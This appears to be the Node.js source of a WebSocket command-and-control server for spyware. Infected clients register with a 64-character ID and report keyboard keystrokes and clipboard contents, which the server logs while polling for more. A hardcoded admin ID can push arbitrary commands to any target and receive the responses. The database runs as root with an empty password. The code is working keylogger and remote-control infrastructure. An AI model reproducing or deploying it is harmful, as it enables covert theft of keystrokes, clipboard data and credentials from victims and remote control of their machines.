var adminID = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
// подключенные клиенты
var clients = [];
var targets = [];
var WebSocketServer = require('ws').Server;

//Database config
var mysql      = require('mysql');
var database = mysql.createConnection({
    host     : 'localhost',
    user     : 'root',
    password : '',
    database : 'users'
});
/*
//VILA I SIPED
function readInt64BEasFloat(buffer, offset) {
    var low = buffer.readInt32BE(buffer, offset + 4);
    var n = buffer.readInt32BE(buffer, offset) * 4294967296.0 + low;
    if (low < 0) n += 4294967296;
    return n;
}

var message =[56,54,12,4,56,31,79,89];
var buf = new Buffer(message);
console.log(buf);
var messageObj = {};
var a = buf.readInt32BE(0).toString(16);
var b = buf.readInt32BE(4).toString(16);

console.log('a = ' + a);
console.log('b = ' + b);
//KINETS KINTSA
*/
//Connecting to database
database.connect(function(err) {
     if (err) {
        console.error('[ERROR]Error connecting to database: ' + err.stack);
        return;
     }
     console.log('[Info]Connected to databace as id ' + database.threadId);
 });


// WebSocket-сервер на порту 25565
var webSocketServer = new WebSocketServer({ port: 25565 });
console.log ('Server is runing');

webSocketServer.on('connection', connection);

function connection(ws) {
    var lastAnswer = [];
    var isAuthorized = false;
    console.log('[Info]New client conected');
    setTimeout(function() {
        if(!isAuthorized){
            ws.close();
        }
    },60000);
    ws.on('message', function incoming(message) {
        //Try to parse JSON
        var backUpJSON = lastAnswer;
        var isParsed = true;
        try {
            lastAnswer = JSON.parse(message);
        }
        catch (e) {
            lastAnswer = backUpJSON;
            console.log('[ERROR]Failed to parse JSON!');
            ws.close();
            isParsed = false;
        }
        //Check id length
        if(lastAnswer['id'] == null){
            console.log('[ERROR]Id = NULL !');
            ws.close();
        }
        else {
            if (lastAnswer['id'].length != 64) {
                console.log('[ERROR]Incorect id length!');
                ws.close();
            }
            else {
                /*console.log('id = ' + inputArr['id']);
                 console.log(clients[inputArr['id']]);
                 clients[inputArr['id']] = ws;*/
                if (clients[lastAnswer['id']] == null) {
                    clients[lastAnswer['id']] = ws;
                    ws.send('accepted');
                    console.log('[Info]Client is authorized ' + lastAnswer['id']);
                    isAuthorized = true;

                }
                else {

                    //Procesing data
                    if (lastAnswer['ok']) {
                        if(targets[lastAnswer['id']]) {
                            if(isParsed) {
                                try {
                                    clients[adminID].send(lastAnswer['data']);
                                }
                                catch (e) {
                                    console.log('[WARNING]Admin is disconected error + ' + e + '!');
                                }
                            }
                            else {
                                clients[adminID].send('[ERROR]Client JSON is not parsed !');
                            }
                        }
                        else {
                            switch (lastAnswer['type']) {
                                case 'keyboard':
                                    console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
                                    getData(lastAnswer['id'], 'getkeyboard');
                                    break;
                                case 'clipboard':
                                    console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
                                    getData(lastAnswer['id'], 'getclipboard');
                                    break;
                                case 'request':
                                    if (lastAnswer['id'] == adminID) {
                                        console.log('Request: ' + lastAnswer['data']['request']);
                                        targets[lastAnswer['data']['targetId']] = true;
                                        try {
                                            clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
                                        }
                                        catch (e) {
                                            ws.send('[ERROR]Client is offline now!');
                                        }
                                    }
                                    else {
                                        console.log('[ERROR]Incorect adminId!');
                                    }
                                    break;
                            }
                        }
                    }
                    else {
                        console.log('[Client ERROR]' + lastAnswer['error']);
                    }
                }
            }
        }
    });
    ws.on('close', function close() {
            /*console.log('[CLOSE !!!] ' + lastAnswer['id']);
            var test = (lastAnswer['id'] in clients);
            console.log('[INDEXOF !!!] ' + test);*/

            if(lastAnswer['id'] in clients){
                 delete  clients[lastAnswer['id']];
                //database.end();
                console.log('[Info]Conection closed id ' + lastAnswer['id']);
            }
            else{
                console.log('[Info]Conection closed client unauthorized' );
            }
        }
    );
}

function getData (id,type){
    clients[id].send(type);
}

/*
database.query('SELECT * FROM keyboard', function(err, rows, fields) {
   // if (err) throw err;
    console.log('The solution is: ' + rows[0]['lol']);
});*/
//database.end();
/*database.query('SELECT * FROM thoughts ORDER BY number', function(err, rows, fields) {
    if (err)  {console.log(err);};

    console.log('The solution is: ', rows[0].solution);
});*/


